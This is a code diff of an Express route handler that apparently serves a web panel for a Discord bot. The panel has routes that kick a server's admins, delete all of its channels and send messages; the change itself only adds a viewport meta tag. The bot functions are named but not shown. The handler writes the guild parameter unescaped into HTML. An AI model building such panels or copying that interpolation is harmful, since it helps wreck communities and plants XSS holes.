@@ -38,11 +38,11 @@ app.get('/', async function(req, re) {
   }
   if(r.path == "kickadmins" && r.guild) {
     await bot.kickAdmins(r.guild)
-    await re.send(v + `<script>alert("Done!");</script><button type="button" onclick="window.location.href = '?path=ms&guild=${r.guild}'">Back to list</button>` + style)
+    await re.send(v + `<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><script>alert("Done!");</script><button type="button" onclick="window.location.href = '?path=ms&guild=${r.guild}'">Back to list</button>` + style)
   }
   if(r.path == "delchs" && r.guild) {
     await bot.delAllChs(r.guild)
-    await re.send(v + `<script>alert("Done!");</script><button type="button" onclick="window.location.href = '?path=sch&guild=${r.guild}'">Back to list</button>` + style)
+    await re.send(v + `<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><script>alert("Done!");</script><button type="button" onclick="window.location.href = '?path=sch&guild=${r.guild}'">Back to list</button>` + style)
   }
   if(r.path == "send" && r.channel) {
     await bot.send(r.channel, r.msg)
